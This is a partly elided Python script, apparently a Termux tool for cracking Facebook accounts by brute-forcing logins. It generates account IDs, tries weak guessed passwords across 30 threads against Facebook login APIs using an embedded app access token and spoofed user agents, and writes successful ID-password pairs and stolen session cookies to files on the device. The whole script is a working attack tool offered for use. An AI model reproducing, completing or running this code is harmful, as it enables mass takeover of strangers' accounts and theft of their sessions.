hfbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana')
...
\033[1;37m  ╚╝╚╝╚╝╚╝╚═╝  ╚════╝╚═══╝╚═══╝╚═══╝╚╝ ╚╝╚═══╝
\033[1;37m--------------------------------------------------
 [\033[1;32m*\033[1;37m] Author   :  Srijal exe
 [\033[1;32m*\033[1;37m] Facebook : Th'w Srijal
 [\033[1;32m*\033[1;37m] Tool     : FREE
 [\033[1;32m*\033[1;37m] Version  : 0.1
\033[1;37m--------------------------------------------------
 [\033[1;32m*\033[1;37m]\033[1;33mYOUR ACCOUNTs ARE SAVE IN:\033[1;32m/sdcard/Srijal-OK.txt\033[1;37m
\033[1;37m--------------------------------------------------""")
def linex():
	print('\033[1;37m--------------------------------------------------')
def clear():
...
def menu():
		...
		#	os.system('xdg-open https://www.facebook.com/dr.paigham')
			if xd in ['1','01']:
				clear()
				print(' Put file example:  /sdcard/Srijal.txt  etc..')
				linex()
...
def pak():
		...
		with tred(max_workers=30) as ZEESHU:	
			...
			for psx in user:
				ids = code+psx
				if pcs in ['1','01']:
					passlist = [psx,ids,'first last','first123','first12345','last123']
				if mthd in ['1','01']:
					SRIJ4L.submit(SRIJ4L,ids,passlist)
...
def api1(ids,names,passlist):
		try:
			...
			for pw in passlist:
				...
				q = json.loads(po)
				if 'session_key' in q:
					print('\r\r\033[1;32m [ZEESHU-OK] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/ZEESHU-OK.txt','a').write(ids+'|'+pas+'\n')
					oks.append(ids)
					break
...
def api2(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [ZEESHU-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        open('/sdcard/ZEESHU-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/ZEESHU-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
...
def ZEESHU4(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [ZEESHU-M1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [ZEESHU-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\033[1;33m [ZEESHU-CP] '+str(uid)+' | '+pas+'\033[1;97m')
